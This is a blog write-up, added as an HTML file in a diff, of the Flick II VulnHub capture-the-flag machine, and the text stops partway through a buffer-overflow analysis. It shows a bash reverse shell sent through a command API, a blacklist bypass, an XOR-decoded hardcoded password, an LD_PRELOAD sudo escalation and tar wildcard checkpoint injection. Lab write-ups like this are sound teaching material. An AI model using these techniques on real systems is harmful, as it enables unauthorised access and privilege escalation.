@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+<meta charset="utf-8">
+<meta name="description" content="">
+<meta name="keywords" content="">
+<meta name="author" content="">
+<meta name="generator" content="Hugo 0.15" />
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="stylesheet" href="http://rastamouse.me/css/style.css" type="text/css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,700" type="text/css">
+<link rel="alternate" href="http://rastamouse.me/index.xml" type="application/rss+xml" title="rastamouse.me">
+<title>Flick II: The Flickening - rastamouse.me</title>
+</head>
+<body>
+
+<header>
+  <div class="container">
+    <a class="path" href="http://rastamouse.me/">[rastamouse.me]</a>
+    <span class="caret"># _</span>
+  </div>
+</header>
+
+<div class="container">
+
+
+<main role="main" class="article">
+  
+<article class="single" itemscope itemtype="http://schema.org/BlogPosting">
+  <div class="meta">
+
+    <span class="key">published on</span>
+    <span class="val"><time itemprop="datePublished" datetime="2015-09-08">September 08, 2015</time></span>
+
+
+    <span class="key">in</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/categories/writeup">writeup</a>
+
+    </span>
+
+
+    <br>
+    <span class="key">tags:</span>
+    <span class="val">
+
+        <a href="http://rastamouse.me/tags/flick">flick</a>
+
+    </span>
+
+  </div>
+  <h1 class="headline" itemprop="headline">Flick II: The Flickening</h1>
+  <section class="body" itemprop="articleBody">
+    
+
+<p>After the success of <a href="https://www.vulnhub.com/entry/flick-1,99/">Flick: I</a>, <a href="https://twitter.com/leonjza">@leonjza</a> decided that VulnHub needed a fresh dose of pain and suffering.  <a href="https://www.vulnhub.com/entry/flick-2,122/">Flick: II</a> is a vulnerable machine with a mobile twist - it requires the attacker to wrestle with a custom Android application to breach the VM.  I was more than complimentary about it on <a href="https://twitter.com/_RastaMouse/status/638789930261585921">Twitter</a> - it&rsquo;s definitely worth checking out.</p>
+
+<h2 id="https:97d1000c18ea8816fa1721a8cb10b128">HTTPS</h2>
+
+<p>After a bit of port scanning we find that only port 443 is open.</p>
+
+<pre><code class="language-text">root@kali:~# curl -v -k https://192.168.56.102
+
+&gt; GET / HTTP/1.1
+&gt; User-Agent: curl/7.38.0
+&gt; Host: 192.168.56.102
+&gt; Accept: */*
+&gt; 
+&lt; HTTP/1.1 200 OK
+* Server nginx/1.6.3 is not blacklisted
+&lt; Server: nginx/1.6.3
+&lt; Content-Type: application/json
+&lt; Transfer-Encoding: chunked
+&lt; Connection: keep-alive
+&lt; X-Powered-By: PHP/5.6.10
+&lt; Cache-Control: no-cache
+&lt; Date: Tue, 08 Sep 2015 17:54:20 GMT
+&lt; 
+* Connection #0 to host 192.168.56.102 left intact
+[&quot;Server Checker&quot;]
+</code></pre>
+
+<p>My usual enumeration techniques (nikto, dirbuster etc) didn&rsquo;t turn up anything except a readable <code>.htaccess</code> file and an ammusing ping/pong.</p>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/ping/
+{&quot;response&quot;:&quot;pong&quot;}
+</code></pre>
+
+<p>Time to have a look at the Android application.</p>
+
+<h2 id="apk:97d1000c18ea8816fa1721a8cb10b128">APK</h2>
+
+<p>I used the Android Studio emulator to run the application.  After creating an AVD in the Studio, I wrote the following <code>BAT</code> files.</p>
+
+<pre><code class="language-text"># This starts the emulator with Nexus AVD
+&quot;D:\Program Files\Android\sdk\tools\emulator.exe&quot; -netdelay none -netspeed full -avd Nexus_5_API_23_x86
+
+# This loads the APK into the running emulator (wait for emu to fully start)
+&quot;D:\Program Files\Android\sdk\platform-tools\adb.exe&quot; install C:\Users\Rasta\Desktop\flick-check-dist.apk
+</code></pre>
+
+<p>Once up and running, the emulator looks a little something like this.  First, enter the IP address of the VM.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/flick-2/1-set-server.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>The application seems to go through some sort of handshake process, then you will be presented with possible commands to run.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/flick-2/2-ps.jpg"  />
+    
+    
+</figure>
+</div>
+
+<p>I spent some time trying to proxy the traffic through Burp, in case the application wasn&rsquo;t too fussy about which certificate it would accept.  But ultimately this proved a bit too fiddly to get working and I couldn&rsquo;t force the emulator to honour the system proxy.  This might be an area I could investigate in the near future, but to solve the VM I decided to disassemble the <code>.apk</code> back into its source code.</p>
+
+<p>I used an <a href="http://www.decompileandroid.com/">online service</a> for this - upload the <code>apk</code> and download the disassembled ZIP file.</p>
+
+<pre><code class="language-text">root@kali:~/flick2/src/com/flick/flickcheck# ls -l
+total 296
+-rw-r--r-- 1 root root   598 Sep  8 17:20 BuildConfig.java
+-rw-r--r-- 1 root root   598 Sep  8 17:20 CallApi$1.java
+-rw-r--r-- 1 root root  2698 Sep  8 17:20 CallApi.java
+-rw-r--r-- 1 root root   311 Sep  8 17:20 CommandActivity$1.java
+-rw-r--r-- 1 root root   612 Sep  8 17:20 CommandActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3480 Sep  8 17:20 CommandActivity$CallAPI.java
+-rw-r--r-- 1 root root  9419 Sep  8 17:20 CommandActivity.java
+-rw-r--r-- 1 root root  2070 Sep  8 17:20 CommandActivity$SSHCommand.java
+-rw-r--r-- 1 root root   631 Sep  8 17:20 DoRegisterActivity$1.java
+-rw-r--r-- 1 root root   615 Sep  8 17:20 DoRegisterActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  4033 Sep  8 17:20 DoRegisterActivity$CallAPI.java
+-rw-r--r-- 1 root root  6369 Sep  8 17:20 DoRegisterActivity.java
+-rw-r--r-- 1 root root   308 Sep  8 17:20 MainActivity$1.java
+-rw-r--r-- 1 root root   609 Sep  8 17:20 MainActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3391 Sep  8 17:20 MainActivity$CallAPI.java
+-rw-r--r-- 1 root root  5146 Sep  8 17:20 MainActivity.java
+-rw-r--r-- 1 root root  2901 Sep  8 17:20 PubKeyManager.java
+-rw-r--r-- 1 root root   836 Sep  8 17:20 R$anim.java
+-rw-r--r-- 1 root root 10526 Sep  8 17:20 R$attr.java
+-rw-r--r-- 1 root root   820 Sep  8 17:20 R$bool.java
+-rw-r--r-- 1 root root  4597 Sep  8 17:20 R$color.java
+-rw-r--r-- 1 root root  4077 Sep  8 17:20 R$dimen.java
+-rw-r--r-- 1 root root  4367 Sep  8 17:20 R$drawable.java
+-rw-r--r-- 1 root root  2199 Sep  8 17:20 ReadApiServerActivity.java
+-rw-r--r-- 1 root root   312 Sep  8 17:20 RegisterActivity$1.java
+-rw-r--r-- 1 root root   613 Sep  8 17:20 RegisterActivity$CallAPI$1.java
+-rw-r--r-- 1 root root  3750 Sep  8 17:20 RegisterActivity$CallAPI.java
+-rw-r--r-- 1 root root  6057 Sep  8 17:20 RegisterActivity.java
+-rw-r--r-- 1 root root  4741 Sep  8 17:20 R$id.java
+-rw-r--r-- 1 root root   545 Sep  8 17:20 R$integer.java
+-rw-r--r-- 1 root root 77594 Sep  8 17:20 R.java
+-rw-r--r-- 1 root root  2240 Sep  8 17:20 R$layout.java
+-rw-r--r-- 1 root root   623 Sep  8 17:20 R$menu.java
+-rw-r--r-- 1 root root   392 Sep  8 17:20 R$mipmap.java
+-rw-r--r-- 1 root root  2078 Sep  8 17:20 R$string.java
+-rw-r--r-- 1 root root 20104 Sep  8 17:20 R$styleable.java
+-rw-r--r-- 1 root root 20526 Sep  8 17:20 R$style.java
+</code></pre>
+
+<p>There is a lot of content to go through, I used <code>grep</code> to find strings that I thought would be interesting.  Ultimately, I was able to work out how the application worked, which I have summerised in the following diagram.</p>
+
+<div align="center">
+	<figure style="background-color: #f2f0ec;" >
+    
+        <img src="/img/writeups/flick-2/handshake.png"  />
+    
+    
+</figure>
+</div>
+
+<ul>
+<li><p>The client submits a POST request to <code>/register/new</code> with a UUID it wishes to register.  The apk has a rather elaborate method of generating a UUID, but I found you can specify any string.</p></li>
+
+<li><p>The server will respond to the client with an ok message and a &lsquo;token&rsquo;.</p></li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/register/new -H 'Content-Type: application/json' -d '{&quot;uuid&quot;:&quot;rasta&quot;}'
+{&quot;registered&quot;:&quot;ok&quot;,&quot;message&quot;:&quot;The requested UUID is now registered.&quot;,&quot;token&quot;:&quot;xgpzOLUyJ45ExFnfalEDESLjgb6drGj3&quot;}
+</code></pre>
+
+<ul>
+<li><p>The client submits a GET request to <code>/do/cmd/</code> to specify a command to run (the command must also be <code>base64</code> encoded).  It must also specify its <code>uuid</code> and <code>token</code> in the <code>header</code>.  Note that the name of the fields also differ slightly.</p></li>
+
+<li><p>The server will respond with the output of the specified command.</p></li>
+</ul>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en 'id' | base64) -H 'Content-Type: application/json' -H 'X-UUID: rasta' -H 'X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3'
+{&quot;status&quot;:&quot;ok&quot;,&quot;command&quot;:&quot;id&quot;,&quot;output&quot;:&quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&quot;}
+</code></pre>
+
+<p>We soon find that there are some blacklisted commands.</p>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en 'ls' | base64) -H 'Content-Type: application/json' -H 'X-UUID: rasta' -H 'X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3'
+{&quot;status&quot;:&quot;error&quot;,&quot;output&quot;:&quot;Command 'ls' contains a banned command.&quot;}
+</code></pre>
+
+<p>But it&rsquo;s possible to bypass this by using full paths.</p>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en '/bin/ls' | base64) -H 'Content-Type: application/json' -H 'X-UUID: rasta' -H 'X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3'
+{&quot;status&quot;:&quot;ok&quot;,&quot;command&quot;:&quot;\/bin\/ls&quot;,&quot;output&quot;:&quot;index.php\n&quot;}
+</code></pre>
+
+<p>Time to get that shell - a simple bash reverse shell will do the trick.</p>
+
+<pre><code class="language-text">root@kali:~# curl -k https://192.168.56.102/do/cmd/$(echo -en '/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.101/4444 0&gt;&amp;1' | base64) -H 'Content-Type: application/json' -H 'X-UUID: rasta' -H 'X-Token: xgpzOLUyJ45ExFnfalEDESLjgb6drGj3'
+
+root@kali:~# nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 45976
+bash: no job control in this shell
+bash-4.2$ id
+uid=998(nginx) gid=997(nginx) groups=997(nginx)
+</code></pre>
+
+<h2 id="robin:97d1000c18ea8816fa1721a8cb10b128">Robin</h2>
+
+<p>The apk has an advertised capability to execute commands over SSH as well as HTTPS.  But since SSH doesn&rsquo;t seem to be enabled on the VM, this doesn&rsquo;t work.  However, there is functional code within the application to establish an SSH connection, but the credentials are rather obscure.</p>
+
+<pre><code class="language-text">public CommandActivity()
+    {
+        integrity_check = &quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;;
+    }
+
+    private static String validate(String s)
+    {
+        char ac[] = new char[31];
+        char[] _tmp = ac;
+        ac[0] = 'T';
+        ac[1] = 'h';
+        ac[2] = 'i';
+        ac[3] = 's';
+        ac[4] = ' ';
+        ac[5] = 'i';
+        ac[6] = 's';
+        ac[7] = ' ';
+        ac[8] = 'a';
+        ac[9] = ' ';
+        ac[10] = 's';
+        ac[11] = 'u';
+        ac[12] = 'p';
+        ac[13] = 'e';
+        ac[14] = 'r';
+        ac[15] = ' ';
+        ac[16] = 's';
+        ac[17] = 'e';
+        ac[18] = 'c';
+        ac[19] = 'r';
+        ac[20] = 'e';
+        ac[21] = 't';
+        ac[22] = ' ';
+        ac[23] = 'm';
+        ac[24] = 'e';
+        ac[25] = 's';
+        ac[26] = 's';
+        ac[27] = 'a';
+        ac[28] = 'g';
+        ac[29] = 'e';
+        ac[30] = '!';
+        StringBuilder stringbuilder = new StringBuilder();
+        for (int i = 0; i &lt; s.length(); i++)
+        {
+            stringbuilder.append((char)(s.charAt(i) ^ ac[i % ac.length]));
+        }
+
+        return stringbuilder.toString();
+    }
+</code></pre>
+
+<p>The SSH password is the result of <code>YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==</code> XOR&rsquo;d with <code>This is a super secret message!</code>.</p>
+
+<p>The username is specified in friendly plaintext.</p>
+
+<pre><code class="language-text">obj = (new JSch()).getSession(&quot;robin&quot;, ((String) (obj)), 22);
+</code></pre>
+
+<p>Some jiggery-pokery to XOR it back&hellip;</p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+
+import sys
+
+xor1 = &quot;YFhaRBMNFRQDFxJEFlFDExIDVUMGEhcLAUNFBVdWQGFeXBIVWEsZWQ==&quot;.decode('base64')
+xor2 = &quot;This is a super secret message!&quot;
+
+for r in range(len(xor1)):
+        sys.stdout.write(chr(ord(xor1[r]) ^ ord(xor2[r % len(xor2)])))
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# ./xor.py 
+40373df4b7a1f413af61cf7fd06d03a565a51898
+</code></pre>
+
+<p>Because SSH is disabled, we can&rsquo;t gain access that way.  But since we have a shell, we can <code>su</code>.</p>
+
+<pre><code class="language-text">bash-4.2$ su robin
+Password: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+
+[robin@fII ~]$ id     
+uid=1000(robin) gid=1000(robin) groups=1000(robin)
+</code></pre>
+
+<h2 id="bryan:97d1000c18ea8816fa1721a8cb10b128">Bryan</h2>
+
+<pre><code class="language-text">[robin@fII ~]$ ls -l
+-rw-r--r-- 1 robin robin 1617 Jul 23 21:35 debug.gpg
+
+[robin@fII ~]$ cat debug.gpg
+cat debug.gpg
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Dude,
+
+I know you are trying to debug this stupid dice thing, so I figured the below
+will be useful?
+
+[...]
+__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &lt;unfinished ...&gt;
+getenv(&quot;LD_PRELOAD&quot;)                                                                                          = nil
+rand()                                                                                                        = 1804289383
+__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
+__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
++++ exited (status 0) +++Dice said: 1804289383
+[...]
+
+Lemme know!
+
+- --
+Sean
+</code></pre>
+
+<pre><code class="language-text">[robin@fII ~]$ sudo -l
+[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+Matching Defaults entries for robin on this host:
+    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS
+    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1
+    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE
+    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY
+    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL
+    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, env_keep+=LD_PRELOAD,
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User robin may run the following commands on this host:
+    (bryan) /usr/local/bin/dice
+</code></pre>
+
+<p>So we have some debugging information and the ability to run <code>dice</code> as bryan.  Running the binary outputs a random number (undoubtedly from the rand() function).</p>
+
+<pre><code class="language-text">[robin@fII ~]$ /usr/local/bin/dice
+Dice said: 1804289383
+</code></pre>
+
+<p>We can also make the following observations:  <code>getenv(&quot;LD_PRELOAD&quot;)</code> in the trace and <code>env_keep+=LD_PRELOAD</code> enabled in sudo.  This looks like we could pull off an <code>LD_PRELOAD</code> trick - by writing our own shared library to replace the rand() call.  Stub out the <code>getenv</code> function in the binary, then specify our own when running sudo.</p>
+
+<p>We can test this by forcing dice to return a fixed value, rather than a random one.</p>
+
+<pre><code class="language-c">char *getenv(const char *name){
+	return 0;
+}
+
+int rand(){
+	return 4444;
+}
+</code></pre>
+
+<pre><code class="language-text">[robin@fII ~]$ gcc -fPIC -shared rand.c -o /tmp/rand.so
+
+[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
+[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
+
+Dice said: 4444
+</code></pre>
+
+<p>Replace 4444 with something more useful&hellip;</p>
+
+<pre><code class="language-c">int rand(){
+        system(&quot;/bin/bash&quot;);
+        return 0;
+}
+</code></pre>
+
+<pre><code class="language-text">[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/rand.so /usr/local/bin/dice
+[bryan@fII robin]$ id
+uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
+</code></pre>
+
+<h2 id="sean:97d1000c18ea8816fa1721a8cb10b128">Sean</h2>
+
+<p><code>/usr/local/bin/</code> actually contains 4 binaries.</p>
+
+<pre><code class="language-text">-rwsr-x---. 1 sean bryan    8830 Jul  2 18:56 backup
+-rwxr-xr-x. 1 root root  1107672 Jun 22 10:20 composer
+-rwx--x--x. 1 root root     8830 Jul  2 17:28 dice
+-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore
+</code></pre>
+
+<p>These look like they will serve as our path from robin &gt; sean &gt; root.  <code>backup</code> is owned by <code>sean</code> and has <code>suid</code> set.</p>
+
+<pre><code class="language-text">[bryan@fII ~]$ /usr/local/bin/backup
+ * Securing environment
+ * Performing database backup...
+app/
+app/.gitignore
+database.sqlite
+framework/
+framework/cache/
+framework/cache/.gitignore
+framework/sessions/
+framework/sessions/.gitignore
+framework/views/
+framework/views/.gitignore
+logs/
+logs/.gitignore
+logs/lumen.log
+ * Backup done!
+</code></pre>
+
+<p>I transfered this to my kali box for closer inspection.</p>
+
+<pre><code class="language-text">root@kali:~# file backup
+backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=47b4cbc324a3676428e493fddbbe5d22d3e2f55d, not stripped
+
+root@kali:~# gdb -q backup
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : ENABLED
+RELRO     : Partial
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ info functions 
+All defined functions:
+
+Non-debugging symbols:
+0x00000000000006a0  _init
+0x00000000000006d0  puts@plt
+0x00000000000006e0  setresuid@plt
+0x00000000000006f0  setresgid@plt
+0x0000000000000700  system@plt
+0x0000000000000710  __libc_start_main@plt
+0x0000000000000720  __gmon_start__@plt
+0x0000000000000730  __cxa_finalize@plt
+0x0000000000000740  _start
+0x0000000000000770  deregister_tm_clones
+0x00000000000007a0  register_tm_clones
+0x00000000000007e0  __do_global_dtors_aux
+0x0000000000000820  frame_dummy
+0x0000000000000858  main
+0x00000000000008d0  __libc_csu_init
+0x0000000000000940  __libc_csu_fini
+0x0000000000000944  _fini
+</code></pre>
+
+<pre><code class="language-text">gdb-peda$ pdisass main
+Dump of assembler code for function main:
+   0x0000000000000858 &lt;+0&gt;:	sub    rsp,0x8
+   0x000000000000085c &lt;+4&gt;:	mov    edx,0x3ea
+   0x0000000000000861 &lt;+9&gt;:	mov    esi,0x3ea
+   0x0000000000000866 &lt;+14&gt;:	mov    edi,0x3ea
+   0x000000000000086b &lt;+19&gt;:	mov    eax,0x0
+   0x0000000000000870 &lt;+24&gt;:	call   0x6e0 &lt;setresuid@plt&gt;
+   0x0000000000000875 &lt;+29&gt;:	mov    edx,0x3ea
+   0x000000000000087a &lt;+34&gt;:	mov    esi,0x3ea
+   0x000000000000087f &lt;+39&gt;:	mov    edi,0x3ea
+   0x0000000000000884 &lt;+44&gt;:	mov    eax,0x0
+   0x0000000000000889 &lt;+49&gt;:	call   0x6f0 &lt;setresgid@plt&gt;
+   0x000000000000088e &lt;+54&gt;:	lea    rdi,[rip+0xbf]        # 0x954
+   0x0000000000000895 &lt;+61&gt;:	call   0x6d0 &lt;puts@plt&gt;
+   0x000000000000089a &lt;+66&gt;:	lea    rdi,[rip+0xdf]        # 0x980
+   0x00000000000008a1 &lt;+73&gt;:	call   0x6d0 &lt;puts@plt&gt;
+   0x00000000000008a6 &lt;+78&gt;:	lea    rdi,[rip+0xfb]        # 0x9a8
+   0x00000000000008ad &lt;+85&gt;:	mov    eax,0x0
+   0x00000000000008b2 &lt;+90&gt;:	call   0x700 &lt;system@plt&gt;
+   0x00000000000008b7 &lt;+95&gt;:	lea    rdi,[rip+0xae]        # 0x96c
+   0x00000000000008be &lt;+102&gt;:	call   0x6d0 &lt;puts@plt&gt;
+   0x00000000000008c3 &lt;+107&gt;:	add    rsp,0x8
+   0x00000000000008c7 &lt;+111&gt;:	ret  
+</code></pre>
+
+<p>Some interesting functions - a <code>setresuid</code>, <code>setresgid</code> and <code>system</code>.</p>
+
+<pre><code class="language-text">setresuid (ruid=0x3ea, euid=0x3ea, suid=0x3ea)
+setresgid (rgid=0x3ea, egid=0x3ea, sgid=0x3ea)
+system (line=0x7f8d5f3309a8 &quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin; cd /usr/share/nginx/serverchecker/storage; /bin/tar -zvcf /home/sean/backup_$(/bin/date +\&quot;%Y%m%d\&quot;).tar.gz *;&quot;)
+</code></pre>
+
+<p>The tell-tale woot woot in this, is the command being passed into system.  There is a wildcard: <code>.tar.gz *</code> which is vulnerable to a <a href="https://www.exploit-db.com/papers/33930/">pretty well documented</a> Tar arbitrary command execution.</p>
+
+<pre><code class="language-text">[bryan@fII bin]$ cd /usr/share/nginx/serverchecker/storage
+[bryan@fII storage]$ &gt;'--checkpoint=1'
+[bryan@fII storage]$ &gt;'--checkpoint-action=exec=sh shell.sh'
+[bryan@fII storage]$ echo '/bin/bash' &gt; shell.sh
+
+[bryan@fII storage]$ ls -l
+
+drwxr-xr-x. 2 nginx nginx   23 Jun 22 10:43 app
+-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint=1
+-rw-rw-r--  1 bryan bryan    0 Sep  8 22:13 --checkpoint-action=exec=sh shell.sh
+-rwxrwxrwx. 1 nginx nginx 6144 Sep  8 20:35 database.sqlite
+drwxr-xr-x. 5 nginx nginx   45 Jun 22 10:43 framework
+drwxr-xr-x. 2 nginx nginx   39 Jun 22 17:16 logs
+-rw-rw-r--  1 bryan bryan   10 Sep  8 22:14 shell.sh
+
+[bryan@fII storage]$ /usr/local/bin/backup
+/usr/local/bin/backup
+ * Securing environment
+ * Performing database backup...
+app/
+app/.gitignore
+database.sqlite
+framework/
+framework/cache/
+framework/cache/.gitignore
+sh-4.2$ id; whoami
+uid=1002(sean) gid=1001(bryan) groups=1002(sean),1001(bryan)
+sean
+</code></pre>
+
+<h2 id="root:97d1000c18ea8816fa1721a8cb10b128">Root</h2>
+
+<p>Up next is <code>-rwsr-x---  1 root sean   866169 Aug 15 11:53 restore</code>.  Trying to run it as we are results in a fail.</p>
+
+<pre><code class="language-text">sh-4.2$ ./restore
+sh: ./restore: Permission denied
+</code></pre>
+
+<p>We have to set our group properly with <code>newgrp sean</code>.</p>
+
+<pre><code class="language-text">bash-4.2$ newgrp sean;
+bash: /home/bryan/.bashrc: Permission denied
+</code></pre>
+
+<p>I think I totally cheated at this point - I went back to bryan and chmodded his home dir and .bashrc file to 777.  Then I was able to set my group.</p>
+
+<pre><code class="language-text">[sean@fII storage]$ id
+uid=1002(sean) gid=1002(sean) groups=1002(sean),1001(bryan)
+</code></pre>
+
+<p>Notice how my <code>gid</code> is now <code>sean</code> rather than <code>bryan</code>.  Now I can execute <code>restore</code>.</p>
+
+<pre><code class="language-text">[sean@fII ~]$ /usr/local/bin/restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: /
+/ does not contain a backup.tar.gz file or access was denied
+
+[sean@fII ~]$ cd /tmp
+[sean@fII tmp]$ touch backup.tar.gz
+
+[sean@fII tmp]$ /usr/local/bin/restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: /tmp/
+Path is: /tmp/
+Enter the output directory: /tmp/
+Output directory is: /tmp/
+This is a beta, run the following command for now: 
+/bin/sh -c &quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&quot;
+You are currently running this tool as: 
+uid=0(root) gid=0(root) groups=0(root),1001(bryan),1002(sean)
+</code></pre>
+
+<p>The command it gives us doesn&rsquo;t look all that useful, but the binary is kind enough to remind us that we are executing with root privs.  As before, I transfered this to my kali box.</p>
+
+<pre><code class="language-text">root@kali:~# file restore
+restore: setuid ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=f8c768078fb1214a9777e6a6a50fef30061716d7, not stripped
+
+gdb-peda$ checksec 
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+</code></pre>
+
+<p>I able to find what appeard to be a buffer overflow in the second input field.</p>
+
+<pre><code class="language-text">root@kali:~# python -c 'print &quot;/root/\n&quot; + &quot;A&quot; * 500' | ./restore
+Restore tool v0.1
+Enter the path to the backup.tar.gz: Path is: /root/
+Enter the output directory: Output directory is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+</code></pre>
+
+<pre><code class="language-text">root@kali:~# python -c 'print &quot;/root/\n&quot; + &quot;A&quot; * 500' &gt; exploit 
+root@kali:~# gdb -q restore
+gdb-peda$ r &lt; exploit 
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffd813d71d0 ('A' &lt;repeats 200 times&gt;...)
+RBX: 0x400310 (&lt;_init&gt;:	sub    rsp,0x8)
+RCX: 0x7ffffdf6 
+RDX: 0x6bf600 --&gt; 0x0 
+RSI: 0x7fe366ca2000 (&quot;Enter the output directory: Output directory is: &quot;, 'A' &lt;repeats 151 times&gt;...)
+RDI: 0x0 
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7ffd813d7218 ('A' &lt;repeats 200 times&gt;...)
+RIP: 0x40101f (&lt;get_out_path+62&gt;:	ret)
+R8 : 0x4141414141414141 ('AAAAAAAA')
+R9 : 0x4141414141414141 ('AAAAAAAA')
+R10: 0x1f4 
+R11: 0x246 
+R12: 0x0 
+R13: 0x401710 (&lt;__libc_csu_init&gt;:	push   r14)
+R14: 0x4017a0 (&lt;__libc_csu_fini&gt;:	push   rbx)
+R15: 0x0
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x401015 &lt;get_out_path+52&gt;:	call   0x402130 &lt;printf&gt;
+   0x40101a &lt;get_out_path+57&gt;:	lea    rax,[rbp-0x40]
+   0x40101e &lt;get_out_path+61&gt;:	leave  
+=&gt; 0x40101f &lt;get_out_path+62&gt;:	ret    
+   0x401020 &lt;do_restore&gt;:	push   rbp
+   0x401021 &lt;do_restore+1&gt;:	mov    rbp,rsp
+   0x401024 &lt;do_restore+4&gt;:	sub    rsp,0x20
+   0x401028 &lt;do_restore+8&gt;:	mov    QWORD PTR [rbp-0x18],rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7ffd813d7218 ('A' &lt;repeats 200 times&gt;...)
+0008| 0x7ffd813d7220 ('A' &lt;repeats 200 times&gt;...)
+0016| 0x7ffd813d7228 ('A' &lt;repeats 200 times&gt;...)
+0024| 0x7ffd813d7230 ('A' &lt;repeats 200 times&gt;...)
+0032| 0x7ffd813d7238 ('A' &lt;repeats 200 times&gt;...)
+0040| 0x7ffd813d7240 ('A' &lt;repeats 200 times&gt;...)
+0048| 0x7ffd813d7248 ('A' &lt;repeats 200 times&gt;...)
+0056| 0x7ffd813d7250 ('A' &lt;repeats 200 times&gt;...)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x000000000040101f in get_out_path ()
+</code></pre>
+
+<p>I found the offset to <code>RIP</code>, using <code>pattern_create</code> &amp; <code>pattern_offset</code> in the Metasploit Framework.</p>
+
+<pre><code class="language-text">Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
